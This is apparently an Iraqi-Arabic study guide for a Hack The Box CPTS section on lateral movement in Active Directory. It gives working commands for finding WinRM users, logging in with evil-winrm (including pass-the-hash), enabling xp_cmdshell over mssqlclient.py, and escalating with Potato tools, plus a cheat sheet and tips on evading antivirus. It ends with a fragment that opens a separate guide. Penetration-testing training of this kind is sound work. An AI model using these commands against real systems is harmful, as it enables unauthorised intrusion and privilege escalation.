1. اصطياد المستخدمين اللي عدهم صلاحية "شاشة الأوامر السوداء" (WinRM) على سيرفرات الشركة.
    
2. اختراق أجهزة الويندوز عن بعد باستخدام أداة `evil-winrm` من نظام اللينكس مالتك.
    
3. تحويل صلاحياتك في قواعد بيانات (MSSQL) إلى اختراق كامل لنظام التشغيل (OS Shell) باستخدام تقنية خطيرة جداً اسمها `xp_cmdshell`.
    

━━━━━

### 🔵 المرحلة 1: خريطة المفاهيم

خلينا نفلتر المصطلحات التقنية بهذا السكشن ونفهمها بالعراقي البسيط، حتى من تقرأ الأوامر تحسها مثل الماي:

**1. WinRM (Windows Remote Management)**

- **شنو يعني؟** اختراع من مايكروسوفت يسمحلك تتحكم بحاسبة ويندوز ثانية عن بعد، بس بدون شاشة وواجهة مثل الـ RDP. ينطيك فقط شاشة أوامر (Command Line). خفيف، سريع، وهو المفصل الأساسي لإدارة الشبكات الكبيرة.
    
- **وين يظهر؟** يشتغل على المنافذ (Ports) رقم 5985 و 5986.
    

**2. Remote Management Users**

- **شنو يعني؟** هذا "جروب" (مجموعة) جاهز داخل الويندوز. مايكروسوفت سوته علمود تحل مشكلة: "أريد فلان يتحكم بالحاسبة عن بعد بالـ WinRM، بس ما أريده يصير Admin ويكدر يمسح النظام". أي يوزر تضيفه بهذا الجروب، راح يكدر يدخل WinRM بصلاحيات محدودة.
    
- **وين يظهر؟** نبحث عنه بأداة PowerView لنعرف منو بي.
    

**3. Cypher Query (استعلام سايفر)**

- **شنو يعني؟** لغة برمجة تشبه SQL بس مخصصة لقواعد البيانات "الشبكية" (Graph Databases). أداة BloodHound تستخدم هذي اللغة. هي ببساطة طريقتك حتى تسأل بلودهوند: "طلعلي كل المستخدمين اللي عدهم طريق يوصل لفلان سيرفر".
    
- **وين يظهر؟** نكتبه بصندوق "Raw Query" داخل BloodHound.
    

**4. evil-winrm**

- **شنو يعني؟** أداة طوروها الهاكرز (تشتغل على لينكس/كالي) حتى تخليك تتصل بسيرفرات الويندوز عبر بروتوكول WinRM بكل سهولة. الأداة مو بس تفتحلك اتصال، لا.. بيها أدوات اختراق مدمجة وتسهلك رفع وتحميل الملفات.
    
- **وين يظهر؟** تستخدمها بالـ Terminal مالتك للاتصال بالهدف.
    

**5. MSSQL (Microsoft SQL Server)**

- **شنو يعني؟** برنامج قواعد البيانات مال مايكروسوفت. المكان اللي الشركات تخزن بيه معلومات زبائنها، رواتبها، وموظفيها. هذا البرنامج يشتغل كـ "خدمة" (Service) داخل الويندوز.
    
- **وين يظهر؟** غالباً يشتغل على المنفذ (Port) رقم 1433.
    

**6. xp_cmdshell**

- **شنو يعني؟** هاي الكارثة الحقيقية. هي "إضافة" (Stored Procedure) داخل الـ MSSQL. وظيفتها الأصلية السماح لمدير قاعدة البيانات إنه يكتب أمر ويندوز (مثل مسح ملف أو عمل نسخة احتياطية) مباشرة من داخل قاعدة البيانات! إذا إحنا كهاكرز كدرنا نفعلها، راح نتحول من "مخترقين لقاعدة البيانات" إلى "مخترقين لنظام الويندوز نفسه".
    

**7. SeImpersonatePrivilege**

- **شنو يعني؟** "صلاحية انتحال الشخصية". الويندوز ينطي هاي الصلاحية لبعض الخدمات (مثل خدمة الـ SQL). معناها: "أنت كخدمة مسموحلك تتنكر وتصير مستخدم ثاني مؤقتاً علمود تمشي شغلك". الهاكرز يستغلون هاي الصلاحية حتى يتنكرون بشخصية "SYSTEM" (أعلى سلطة بالويندوز) ويخترقون الجهاز بالكامل.
    

**8. Impacket (mssqlclient.py)**

- **شنو يعني؟** Impacket هي حزمة عظيمة من السكربتات المكتوبة بالبايثون اللي تفهم لغة الويندوز وتتكلم وياه. `mssqlclient.py` هو سكربت من هاي الحزمة يخليك تتصل بقاعدة بيانات مايكروسوفت (MSSQL) من جهاز اللينكس مالتك.
    

━━━━━

### 🟡 المرحلة 2: هيكل السكشن — شنو يعلّمك وكيف؟

📖 **عنوان السكشن وموضوعه:**

السكشن مقسوم لجزأين رئيسيين: استغلال الـ **WinRM**، واستغلال **SQL Server Admin**. الموضوع يقع في صميم عمليات التحرك الجانبي (Lateral Movement) في مسار CPTS.

🎯 **ماذا يريد هذا السكشن أن تتعلم؟**

بعد قراءة هذا السكشن، المفروض تكون قادر على:

1. استكشاف واستغلال صلاحيات الدخول عن بعد (WinRM) باستخدام أدوات من الويندوز واللينكس.
    
2. البحث في BloodHound باستخدام لغة Cypher المخصصة لإيجاد ثغرات الصلاحيات المخفية.
    
3. التوغل داخل خوادم قواعد البيانات (MSSQL) وتحويل هذا الوصول إلى اختراق كامل لنظام التشغيل (OS Command Execution).
    

📐 **هيكل المحتوى (Section Blueprint):**

السكشن مصمم يمشيك بمسارين متوازيين لأساليب الدخول:

Plaintext

```
[نقطة البداية: نمتلك يوزر عادي (Foothold)]
       │
       ├────────────────────────────────────────┐
       ▼                                        ▼
[المسار الأول: WinRM]                  [المسار الثاني: MSSQL]
       │                                        │
       ▼                                        ▼
[الاستطلاع: PowerView و BloodHound Cypher]  [الاستطلاع: BloodHound و PowerUpSQL]
       │                                        │
       ▼                                        ▼
[الاتصال: PSSession (ويندوز) / evil-winrm (لينكس)] [الاتصال: mssqlclient.py (لينكس)]
       │                                        │
       ▼                                        ▼
[الهدف: الحصول على Shell محدود]          [التصعيد: تفعيل xp_cmdshell]
                                                │
                                                ▼
                                       [الهدف: Shell يمتلك SeImpersonate]
```

🔗 **المتطلبات السابقة:**

حتى تفهم هذا السكشن، لازم تكون فاهم أساسيات الـ Active Directory (مثل شنو يعني Domain User)، وتعرف تستخدم الـ Terminal باللينكس (Kali/Parrot)، وتعرف أساسيات الاستعلام في قواعد البيانات. ولازم تكون استخدمت BloodHound سابقاً لمعرفة شكل واجهته.

🚪 **ما يُفتح بعده:**

هذا السكشن هو الجسر اللي يوصلك لـ **Windows Privilege Escalation (رفع الصلاحيات في ويندوز)**. السكشن ينتهي بيك وأنت تمتلك صلاحية `SeImpersonate`، والموديول اللي بعده راح يعلمك شلون تستخدم أدوات الـ Potato (مثل JuicyPotato) لتحويل هاي الصلاحية إلى `SYSTEM`.

⚠️ **ما يذكره السكشن ضمنياً (افتراضات مخفية):**

1. السكشن يفترض إنك كدرت تسرب (Dump) الباسورد أو الهاش الخاص بالمستخدمين (`forend` و `damundsen`) قبل لا تبدأ بهاي الخطوات.
    
2. يفترض إن أجهزة الحماية (AV/EDR) نايمة أو تم تجاوزها، لأن تشغيل `xp_cmdshell` في الواقع يخلي شاشات الـ Blue Team تضوي بالأحمر!
    
3. يفترض إنك منزل حزمة Impacket على جهاز اللينكس مالتك.
    

━━━━━

### 🟠 المرحلة 3: الشرح العميق

هنا راح نفلش السكشن وحدة وحدة، ونفهم كل أداة وأمر ليش انكتب وشلون يشتغل.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [1]: استطلاع صلاحيات الـ WinRM

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

أنت هسة داخل الشبكة وتريد تعرف: "يا حاسبة أقدر أدخللها شاشة أوامر سوداء (WinRM) باستخدام اليوزرات اللي عندي؟". الويندوز بي جروب اسمه "Remote Management Users"، أي شخص بهذا الجروب يكدر يدخل. راح نستخدم PowerView أو BloodHound حتى نسأل هذا السؤال ونجيب الأسماء.

🎭 **التشبيه:**

مثل ما توكف يم باب بناية، وتلزم سجل الحراس (PowerView)، وتدور بصفحة "المسموح لهم بالدخول بعد الدوام الرسمي". إذا لقيت اسم صديقك، تكدر تاخذ باجه وتفوت.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

مايكروسوفت سوت هذا الجروب (Remote Management Users) بالويندوز 8 فما فوق، حتى تقلل من إعطاء صلاحيات الـ Admin. بدل ما أنطي موظف الدعم الفني صلاحية مدير كاملة بس علمود يشيك النظام عن بعد، أنطيه بس صلاحية "الإدارة عن بعد". المشكلة وين؟ إن الموظف يتنقل بين الأقسام والـ IT ينسون يمسحون اسمه من الجروب، فيبقى عنده باب خلفي شرعي مفتوح!

🔧 **الأمر / الأداة (باستخدام PowerView):**

PowerShell

```
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

💬 **شرح الـ flags:**

- `-ComputerName`: نحدد اسم الحاسبة الهدف اللي نريد نفحصها.
    
- `-GroupName`: نحدد اسم الجروب (مجموعة الإدارة عن بعد). ولا تنسى علامات الاقتباس لأن اكو مسافات بالاسم.
    

📤 **الـ Output المتوقع:**

Plaintext

```
ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

🔍 **كيف تقرأ الـ Output؟:**

أهم سطر هو `MemberName`. النتيجة تكولك إن المستخدم اللي اسمه `forend` (واللي تابع لدومين INLANEFREIGHT) موجود داخل هذا الجروب. هذا يعني إن `forend` يمتلك حق الدخول عن بعد لهذا السيرفر!

**شلون نسوي هذا بـ BloodHound؟ (Cypher Query)**

مرات ما نقدر نستخدم PowerView، فنروح لـ BloodHound ونكتب "كود سايفر" (Cypher):

Cypher

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

💬 **شرح الكود (مهم جداً تفهمه مو بس تنسخه):**

- `MATCH`: مثل SELECT بقواعد البيانات، يعني "ابحث لي عن".
    
- `shortestPath`: دالة تدور أقصر طريق بين نقطتين بالرسم البياني.
    
- `(u1:User)`: ابدأ من أي مستخدم.
    
- `-[r1:MemberOf*1..]->(g1:Group)`: اللي يكون عضو بجروب معين (حتى لو عضوية متداخلة عبر عدة جروبات).
    
- `[:CanPSRemote*1..]->(c:Computer)`: وبنفس الوقت، هذا المستخدم عنده صلاحية (CanPSRemote) اللي هي WinRM، على أي حاسبة (Computer).
    
- `RETURN p2`: ارسملي هذا المسار على الشاشة.
    

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- _ليش نستخدم Cypher إذا PowerView موجود؟_ لأن PowerView يفحص حاسبة وحدة بس (إلا إذا سويت سكربت معقد). BloodHound يفحص الشبكة **كلها** بضغطة وحدة لأن البيانات مخزونة عنده مسبقاً، ويكشفلك العضويات المتداخلة (يعني يوزر عضو بجروب، والجروب عضو بجروب ثاني عنده الصلاحية).
    

⏸️ **نقطة توقف:** اكتشفنا إن اليوزر `forend` عنده صلاحية WinRM. هسة لازم نستخدم هاي الصلاحية وندخل!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [2]: الدخول وتأسيس الجلسة عبر WinRM

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

بما إنه عرفنا `forend` يكدر يفوت، هسة راح نفوت! إذا إحنا كاعدين على حاسبة ويندوز (مخترقيها مسبقاً)، نستخدم أمر `Enter-PSSession` مال مايكروسوفت. وإذا كاعدين على الكالي لينكس مالتنا، نستخدم أداة الهاكرز `evil-winrm`.

🎭 **التشبيه:**

عرفنا إن صديقنا عنده مفتاح الانتركم. هسة إحنا لو نستخدم جهاز الانتركم مال الشركة (من الويندوز)، لو نستخدم جهاز انتركم معدل ومطور جايبينه ويانا بجنطتنا (evil-winrm من اللينكس).

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

بروتوكول WinRM يعتمد على الـ HTTP/HTTPS بنقل البيانات (يشتغل على بورت 5985/5986). هذا تصرف ذكي من مايكروسوفت لأن أغلب الجدران النارية (Firewalls) تسمح بمرور الـ HTTP. أداة `evil-winrm` تبرمجت حتى تستغل هذا البروتوكول وترتبلك الـ Output بحيث يبين كأنه Terminal عادي مريح جداً.

🔧 **الأداة (من اللينكس باستخدام evil-winrm):**

Code snippet

```
evil-winrm -i 10.129.201.234 -u forend
```

_(راح يطلب الباسورد وتكتبه)_

💬 **شرح الـ flags:**

- `-i`: الـ IP مال الهدف (السيرفر اللي نريد نختقه).
    
- `-u`: اليوزر اللي عرفنا عنده صلاحية (اللي هو forend).
    
    _(ملاحظة: تكدر تمرر الباسورد مباشرة بـ `-p` أو تمرر الهاش بـ `-H` وهذا سحر الأداة، تدعم Pass-the-Hash!)_
    

📤 **الـ Output المتوقع:**

Plaintext

```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

🔍 **كيف تقرأ الـ Output؟:**

بمجرد ما تشوف `*Evil-WinRM* PS`، مبروك! أنت هسة تمتلك شيل (Shell) على السيرفر الهدف بصلاحيات `forend`. كتبنا أمر `hostname` للتحقق، وجاوبنا السيرفر باسمه. أنت هسة داخل الحاسبة.

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- _ليش evil-winrm مو أداة ثانية؟_ لأنها مستقرة جداً، ما تعلق بسهولة، وتخليك ترفع ملفات وتنزل ملفات بسهولة (بأوامر upload/download)، وتدعم تحميل سكربتات PowerShell مباشرة للذاكرة بدون ما تلامس الهارد ديسك (حتى تتجاوز الـ Antivirus).
    

⏸️ **نقطة توقف:** خلصنا من الـ WinRM. أخذنا اليوزر، فحصنا صلاحيته، ودخلنا للسيرفر كـ Command Line.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔷 المفهوم/التقنية [3]: استطلاع واستغلال MSSQL Server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 **بالعراقي البسيط:**

قواعد البيانات (MSSQL) بالشركات مو بس تخزن أرقام وحروف، هي عبارة عن برامج عملاقة مدمجة بالويندوز. إذا كدرت تحصل يوزر عنده صلاحية "مدير قاعدة بيانات" (sysadmin)، تكدر تستخدم قاعدة البيانات كـ "جسر" حتى تخترق السيرفر اللي شايلها بالكامل.

🎭 **التشبيه:**

تخيل حصلت مفتاح المخزن مال الشركة (قاعدة البيانات). المخزن هذا بيه باب سري مخصص لعمال الصيانة يوديك لغرفة التحكم الرئيسية بالبناية (xp_cmdshell). أنت راح تدخل المخزن، تفتح الباب السري، وتسيطر على البناية.

🔬 **ليش يعمل هيج؟ (المبدأ الجوهري):**

مايكروسوفت صممت ميزة اسمها `xp_cmdshell` داخل الـ SQL Server. هذي الميزة تسمح لمدير البيانات إنه يكتب أوامر System (مثل إنشاء مجلد للباك أب) مباشرة من سطر أوامر الـ SQL! هاي ميزة (Feature) مو ثغرة. بشكل افتراضي هي معطلة لحماية النظام، بس بما إنك تمتلك صلاحية `sysadmin` (مدير)، من حقك كمدير إنك "تفعلها"! وهذا اللي راح نسويه.

**الخطوة 1: الفحص بالبلودهوند:**

- نستخدم نفس فكرة الكود سايفر الفات، بس نبحث عن علاقة `[:SQLAdmin*1..]`. السكشن يوضح إن اليوزر `damundsen` يمتلك هاي الصلاحية على السيرفر `ACADEMY-EA-DB01`.
    

**الخطوة 2: الاتصال بقاعدة البيانات (باستخدام mssqlclient.py من لينكس):**

🔧 **الأداة:**

Code snippet

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

💬 **شرح الـ flags:**

- `INLANEFREIGHT/DAMUNDSEN`: اسم الدومين واسم المستخدم.
    
- `@172.16.5.150`: الـ IP مال سيرفر قاعدة البيانات.
    
- `-windows-auth`: هذا فلاج جداً جداً مهم! الـ SQL Server بي نوعين من تسجيل الدخول: حسابات خاصة بالـ SQL نفسه، وحسابات الويندوز (Active Directory). هذا الفلاج يكول للأداة: "استخدم طريقة الويندوز بتسجيل الدخول".
    

📤 **الـ Output المتوقع:**

Plaintext

```
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

أنت هسة داخل الـ SQL!

**الخطوة 3: تفعيل الباب السري (xp_cmdshell) وتشغيل الأوامر:**

Code snippet

```
SQL> enable_xp_cmdshell
[*] INFO: Configuration option 'xp_cmdshell' changed from 0 to 1.
```

هذا الأمر السحري داخل أداة Impacket يقوم بتفعيل الميزة بالخلفية (يسوي RECONFIGURE).

هسة نكتب أي أمر ويندوز يسبقه كلمة `xp_cmdshell`:

Code snippet

```
SQL> xp_cmdshell whoami /priv
```

📤 **الـ Output المتوقع (المهم فقط):**

Plaintext

```
Privilege Name                Description                               State      
============================= ========================================= ========   
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
```

🔍 **كيف تقرأ الـ Output؟:**

الأمر `whoami /priv` يسأل الويندوز: "شنو الصلاحيات الخاصة اللي يمتلكها اليوزر الحالي؟".

بما إنك كاعد تنفذ الأوامر من خلال خدمة الـ SQL، راح تظهرلك صلاحيات الـ Service Account (حساب الخدمة اللي مشغل الـ SQL).

شوف السطر الذهبي: **SeImpersonatePrivilege ... Enabled**.

هذا يعني إن حساب الـ SQL عنده القدرة العظيمة على "انتحال الشخصية". يعني تكدر تستخدم أدوات رفع الصلاحيات (PrivEsc) مثل JuicyPotato لتتحول فوراً إلى `NT AUTHORITY\SYSTEM` (الإله في نظام الويندوز)!

Plaintext

```
كيف يعمل هجوم MSSQL:
Request:  Attacker (mssqlclient.py)
            │
            ▼
       ┌───────────────┐
       │ MSSQL Server  │  <-- (نمتلك فيه Sysadmin)
       │ enable_xp_cmds│  <-- (نفعل الباب السري)
       └──────┬────────┘
              │
              ▼
       ┌───────────────┐
       │ Windows OS    │
       │ xp_cmdshell   │  <-- (نرسل أمر whoami)
       │ SeImpersonate │  <-- (نجد الثغرة لرفع الصلاحيات)
       └───────────────┘
```

❓ **الـ "بس ليش؟" — أسئلة شائعة:**

- _ليش خدمة الـ SQL عدها SeImpersonate؟_ لأن خدمة الـ SQL مرات تحتاج تنفذ مهام بالنيابة عن مستخدمين آخرين بالشبكة (تنتحل شخصيتهم) حتى تقرأ ملفاتهم وتخزنها، لذلك الويندوز يعطيها هاي الصلاحية افتراضياً كنوع من تسهيل العمل.
    

⏸️ **نقطة توقف:** دخلنا كمدير قاعدة بيانات، فعلنا ميزة تنفيذ الأوامر، ونفذنا أوامر على الويندوز نفسه واكتشفنا طريق لرفع الصلاحيات إلى SYSTEM!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **ملخص ما تعلمنا لحد هسة:**

|**المفهوم/الأداة**|**ما يعنيه**|**متى تستخدمه**|
|---|---|---|
|**WinRM**|وصول شاشة أوامر (Terminal) عن بعد لسيرفرات ويندوز.|لما تكتشف إن اليوزر مالتك عنده صلاحية بجروب الإدارة عن بعد.|
|**evil-winrm**|أداة اختراق للاتصال بـ WinRM من الكالي لينكس.|للحصول على Shell ثابت وتمرير الباسورد أو الهاش بسهولة.|
|**Cypher Query**|لغة بحث مخصصة للـ BloodHound.|للبحث العميق عن مسارات الهجوم المعقدة والمخفية.|
|**mssqlclient.py**|سكربت للاتصال بقواعد بيانات SQL من اللينكس.|من تسرق يوزر عنده صلاحية SQLAdmin.|
|**xp_cmdshell**|ميزة بـ SQL تتيح تشغيل أوامر ويندوز (OS Commands).|لتحويل اختراق قاعدة البيانات إلى اختراق لنظام التشغيل.|

━━━━━

### 🔴 المرحلة 4: ما لا يقوله السكشن

هذا السكشن يعطيك التقنية بشكلها المثالي بالمختبر، بس بالواقع الميداني (Pentesting) وبامتحان الـ CPTS، الأمور تصير أعقد. خليني أنطيك الأسرار:

🕳️ **الثغرات في شرح السكشن:**

1. **السكشن ما ذكر مدى الإزعاج الأمني (Noise) لـ xp_cmdshell:** بالسكشن، كتبنا `enable_xp_cmdshell` وكأن الموضوع عادي. بالواقع، أي بيئة بيها أدوات حماية (EDR) مثل CrowdStrike أو SentinelOne راح تطلق إنذار مرعب لمدير الشبكة. ليش؟ لأن خوارزميات الحماية مبرمجة تعتبر "خدمة SQL (اللي مفروض بس تقرأ داتا) فجأة شغلت برنامج `cmd.exe`" تصرف خبيث 100%. بالواقع، ممكن تحتاج طرق بديلة صامتة (مثل استخدام Custom Assemblies - SQL CLR) لتنفيذ كود بدل `xp_cmdshell`.
    
2. **السكشن ما وضح مشكلة الاتصال بقاعدة البيانات:** أداة `mssqlclient.py` مرات تفشل بالاتصال مو لأن الباسورد غلط، بس لأنها تحاول تتصل كحساب SQL داخلي مو حساب Active Directory. السكشن حط فلاج `-windows-auth` بسرعة، بس لازم تفهم إن بدون هذا الفلاج، الـ SQL Server راح يدور على يوزر اسمه `DAMUNDSEN` داخل ملفاته الخاصة ويفشل، بدل ما يسأل الـ Domain Controller.
    

⚠️ **الـ Gotchas (الفخوخ) عند تطبيق هذا بالـ Lab أو الـ Exam:**

1. **فخ باسوورد الـ evil-winrm:** إذا الباسورد اللي سرقته يحتوي على رموز غريبة (مثل `$`, `!`, `&`)، الـ Linux Terminal راح يعتبرها متغيرات ويفسد الباسورد قبل ما يرسله للهدف! دائماً ضع الباسورد بين علامات اقتباس مفردة `'P@ssw0rd!'` داخل أمر `evil-winrm` لتتجنب ساعات من التفكير ليش الاتصال يفشل.
    
2. **فخ إعادة الإغلاق (Cleanup):** بالسكشن شغّل `enable_xp_cmdshell` وعافها. باختبار الاختراق الحقيقي (وهذا يُحاسب عليه كمحترف)، لازم بعد ما تخلص شغلك ترجع تكتب `disable_xp_cmdshell` حتى ترجع السيرفر لحالته الأصلية وما تترك أبواب خلفية للهاكرز السيئين.
    
3. **مشكلة PowerUpSQL:** هاي الأداة عظيمة، بس الـ Windows Defender يموت منها ويمسحها فوراً لأنها مصنفة كأداة هاكرز. باللاب ممكن تشتغل، بالامتحان غالباً لازم تستخدم `mssqlclient.py` من اللينكس لأنه بعيد عن عيون الـ Defender.
    

🔗 **ربط بسكاشن وموديولات أخرى:**

الوصول إلى `SeImpersonatePrivilege` اللي شفناه بنهاية الـ SQL يعتبر حجر الأساس لموديول **Windows Privilege Escalation**. أي مرة بحياتك تحصل شيل عن طريق خدمة ويب (IIS) أو خدمة داتا (SQL)، بنسبة 95% راح تلكى هاي الصلاحية وتستخدم عائلة بطاطا الهاكرز (JuicyPotato, RoguePotato, PrintSpoofer) حتى تصعد إلى SYSTEM.

🌍 **السياق الحقيقي (Real Pentest Context):**

منين الهاكرز يجيبون باسوورد الـ SQL أصلاً؟ السكشن ذكر Kerberoasting وهذا صحيح. بس بالواقع، أغلب اختراقات الشركات تصير لأن المطورين مبرمجين موقع للشركة (Web App)، وحاطين يوزر وباسورد الـ SQL داخل ملف اسمه `web.config` أو `appsettings.json` كنص واضح (Cleartext). الهاكر يقرأ الملف، ياخذ الباسورد، ويشغل `mssqlclient.py` ويدمر الشبكة.

🏆 **النصيحة الذهبية للـ CPTS Exam:**

بامتحان CPTS، إذا استلمت أي يوزر وباسورد جديد بأي مرحلة من الامتحان، قاعدة ذهبية: قبل لا تدور على ثغرات معقدة، افتح ترمينال وجرب `evil-winrm` بهذا اليوزر على كل السيرفرات المهمة اللي لقاها BloodHound. "الأبواب المنسية" (مثل WinRM للـ IT Support) هي الطريق الأسرع والمقصود غالباً للنجاح بالامتحان. ولا تنسى فحص `SQLAdmin` بالـ BloodHound!

━━━━━

### 💎 الفلاشكاردز — ملخص السكشن للحفظ

هاي البطاقات ركز بيها قبل ما تدخل اللاب مال هذا السكشن:

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

❓ Front: ما هو المنفذ (Port) الافتراضي الذي يعمل عليه بروتوكول WinRM؟

✅ Back: 5985 لـ (HTTP) و 5986 لـ (HTTPS).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

❓ Front: ما هو الجروب الذي يسمح للمستخدم بالدخول عبر WinRM دون أن يكون Local Admin؟

✅ Back: مجموعة Remote Management Users.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

❓ Front: ما هي الأداة المفضلة في Linux للاتصال بسيرفرات الويندوز باستخدام بروتوكول WinRM؟

✅ Back: أداة `evil-winrm`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

❓ Front: عند الاتصال بـ SQL Server باستخدام `mssqlclient.py` ويوزر الدومين، ما هو الـ Flag الضروري جداً؟

✅ Back: يجب استخدام الفلاج `-windows-auth` لتبليغ السيرفر أن المصادقة تتم عبر Active Directory.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

❓ Front: ما هو المنفذ الافتراضي لخدمة قواعد البيانات Microsoft SQL Server (MSSQL)؟

✅ Back: المنفذ 1433.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

❓ Front: ما هي الميزة التي يتم تفعيلها داخل MSSQL للسماح بتنفيذ أوامر نظام التشغيل (OS Commands)؟

✅ Back: ميزة `xp_cmdshell`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

❓ Front: عندما تنفذ الأوامر عبر خدمة الـ SQL، ما هي الصلاحية الخطيرة (Privilege) التي تمتلكها الخدمة عادةً لرفع الصلاحيات إلى SYSTEM؟

✅ Back: صلاحية `SeImpersonatePrivilege`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

### 📄 ورقة غش السكشن — للسكرين شوت

🛑 هذه ورقة الغش خاصة بأوامر وتقنيات هذا السكشن (WinRM & MSSQL Enumeration/Exploitation).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 ورقة غش: Privileged Access - WinRM & MSSQL

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 **هدف هذا السكشن بجملة:**

البحث عن صلاحيات الإدارة عن بُعد المنسية (WinRM/SQL) واستغلالها للوصول لسطر أوامر النظام (Shell) كطريق بديل عن ثغرات الـ Exploits.

⚔️ **خوارزمية التطبيق:**

1. تمتلك يوزر؟ افحص انتماءاته بالـ PowerView أو Cypher (BloodHound).
    
2. هل يمتلك CanPSRemote أو جزء من Remote Management Users؟
    
    ← نعم؟ اتصل فوراً باستخدام `evil-winrm`.
    
3. هل يمتلك SQLAdmin؟
    
    ← نعم؟ اتصل باستخدام `mssqlclient.py`.
    
    ← فعّل `xp_cmdshell`.
    
    ← نفذ الأوامر وافحص `whoami /priv` للبحث عن SeImpersonate.
    

📐 **جدول الأوامر الأساسية لهذا السكشن:**

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|**فحص جروب WinRM**|`Get-NetLocalGroupMember -ComputerName MS01 -GroupName "Remote Management Users"`|عبر سكريبت PowerView من الويندوز.|
|**الدخول بـ WinRM من لينكس**|`evil-winrm -i <IP> -u <USER> -p '<PASS>'`|استخدم الـ IP ومرر الباسورد בין علامات اقتباس مفردة.|
|**الاتصال بـ SQL من لينكس**|`mssqlclient.py <DOMAIN>/<USER>@<IP> -windows-auth`|لا تنسى `-windows-auth` إذا اليوزر من الـ AD.|
|**تفعيل أوامر النظام بـ SQL**|`SQL> enable_xp_cmdshell`|هذا الأمر يفعّل الخاصية، بعدها تقدر تستخدمها.|
|**تنفيذ أمر نظام داخل SQL**|`SQL> xp_cmdshell whoami /priv`|يفحص صلاحيات النظام الخاصة بـ Service Account.|

🔢 **قيم وثوابت مهمة:**

- **5985 (HTTP) / 5986 (HTTPS):** بورتات WinRM.
    
- **1433:** بورت خدمة MSSQL.
    
- `CanPSRemote` / `SQLAdmin`: العلاقات (Edges) المهمة بالـ BloodHound للبحث عن هذا النوع من الوصول.
    

🚨 **الفخوخ الخاصة بهذا السكشن:**

❌ [فخ الـ WinRM Password]: استخدام رموز خاصة في باسورد `evil-winrm` بدون علامات اقتباس يفسد الأمر باللينكس.

❌ [فخ الـ SQL Auth]: محاولة الدخول للـ SQL بيوزر الدومين بدون فلاج `-windows-auth` (راح يفشل الاتصال).

❌ [فخ الـ EDR]: تفعيل `xp_cmdshell` مزعج أمنياً جداً، بالبيئات الحقيقية (خارج اللاب) قد يغلق لك الجلسة فوراً ويطردك!

💡 **Golden Tip:**

بالـ CPTS، إذا اخترقت سيرفر الـ SQL وشفت صلاحية `SeImpersonate`، لا تضيع وقت تدور غير شي. ارفع أداة `PrintSpoofer.exe` أو `JuicyPotato.exe` عن طريق الـ SQL ونفذها لتحصل على SYSTEM فوراً!

━━━━━

بهيج خلصنا. هسة عندك:

✅ ليش هذا الموضوع موجود (Big Picture)

✅ كل المصطلحات الجديدة بالسكشن

✅ كيف السكشن مبني وشنو يبي يعلمك

✅ الشرح العميق لكل مفهوم بأمثلة وتشبيهات

✅ ما لم يقله HTB (الـ gotchas والثغرات بالشرح)

✅ فلاشكاردز السكشن

✅ ورقة غش مخصصة للـ lab

الآن ارجع اقرأ نص السكشن الأصلي بـ HTB — وراح تلاحظ إن كل جملة صارت واضحة وإن فاهم ليش موجودة. بالتوفيق! 💪

---

```
  ══════════════════════════════════════════════════════════════════
  [✓] PHASE_II ATTACK SEQUENCES DOCUMENTED
  [✓] 6 / 6 EXPLOITATION METHODS CAPTURED
  [→] LOADING DEEP-DIVE ANALYSIS & GLOSSARY . . .
  ══════════════════════════════════════════════════════════════════
```

---

## 🔴 PHASE_III — دليل الاختراق :: التحليل والمصطلحات

> [!warning] ⚠️ PHASE III INITIALIZED · EXPLOITATION GUIDE & GLOSSARY **Language:** Arabic + English Mixed — **Size:** ~2,000 Words **Content:** Arabic breakdown of all 6 methods · Flashcards · Cheat Sheet · Golden Tips.

---

تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

